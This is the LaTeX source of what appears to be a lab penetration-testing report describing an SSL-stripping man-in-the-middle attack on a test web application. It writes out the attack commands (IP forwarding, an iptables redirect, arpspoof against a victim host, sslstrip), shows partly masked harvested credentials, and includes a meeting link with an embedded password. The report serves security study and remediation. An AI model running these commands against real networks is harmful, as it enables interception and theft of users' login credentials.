\documentclass[10pt,a4paper]{article}

\usepackage[a-1b]{pdfx} %high quality pdf
\usepackage{datetime}
\usepackage{numprint}
\usepackage{palatino}
\usepackage{authblk}
\usepackage[margin=0.75in]{geometry}
\usepackage{hyperref}
\usepackage{graphicx}
\usepackage{titlesec}
\usepackage{listings}

\pdfgentounicode=1

\setlength{\parindent}{2em}
%\setlength{\parskip}{1em}
\renewcommand{\baselinestretch}{1.1}

\begin{document}

\nplpadding{2}
\newdateformat{isodate}{\THEYEAR-\numprint{\THEMONTH}-\numprint{\THEDAY}}

\title{Penetration Testing Report for Ex0e0\\ \large{\textit{Codename: `SSLStrip'}}}
\author{Naman Arora}
\date{\isodate\today}

\maketitle
\section{Finding: Web Application Vulnerable to MiTM Attack}
        \subsection{Risk Rating: 8.0}
        The Web Application being hosted at \textit{`172.30.0.128'} is vulnerable to MiTM attack using SSL striping technique.
        \subsection{Vulnerability Description}
        An attacker can launch a Man-in-The-Middle attack on a victim visiting \textit{`www.f4rmc0rp.com/Corp`} and harvest login credentials.
        \subsection{Confirmation Method}
        The landing page of \textit{`www.f4rmc0rp.com/Corp'} is unsecured which leads a SSL/TLS secured login page (Fig. \ref{landing}).
        \subsection{Remediation}
        The landing page must also be secured in the SSL/TLS layer encryption security akin to the login page that follows.
\begin{figure}[h!]
	\includegraphics[width=\textwidth]{pics/landing.png}
	\caption{Unsecure landing page}
        \label{landing}
\end{figure}

\newpage
\section{Attack Narrative}
On gaining root access to \textit{`10.30.0.32`}, using credentials harvested at an earlier time, and sniffing for packets on that machine,
it was discovered that, a website was being hosted at \textit{`www.f4rmc0rp.com/Corp`} and was being accessed by a victim from host \textit{`10.30.0.90`} (Fig. \ref{capture}).
\begin{figure}[h!]
	\includegraphics[width=\textwidth]{pics/capture.png}
	\caption{Packet Capture}
        \label{capture}
\end{figure}

After enabling IPv4 forwarding on \textit{`devbox`} by manupulating the kernel parameter and IPTable rules, like
\begin{lstlisting}[language=bash]
	>> echo 1 > /proc/sys/net/ipv4/ip_forward
        >> iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 12345
\end{lstlisting}
an arpspoofing campaign was launched using,
\begin{lstlisting}[language=bash]
	>> arpspoof -i ens33 -t 10.30.0.90 -r 10.30.0.1
\end{lstlisting}
and a \textit{`SSLStrip`} session was initiated using,
\begin{lstlisting}[language=bash]
	>> python sslstrip.py -l 12345 -l logfile
\end{lstlisting}

This led to deanonymization and harvesting of credentials \textit{`s.shephard`}:`KEY015-*****b*******E********==`.
On using these credentials on the secure login page, this page was revealed \ref{secure_page}.
\begin{figure}[h!]
	\includegraphics[width=\textwidth]{pics/secure_page.png}
	\caption{Secure Page}
        \label{secure_page}
\end{figure}

The group meeting URL is \href{https://ufl.zoom.us/j/94780428624?pwd=L3FVSXY2a1hlUnI5WWMzbGp3UU4rUT09}{https://ufl.zoom.us/j/94780428624?pwd=L3FVSXY2a1hlUnI5WWMzbGp3UU4rUT09}.

\end{document}
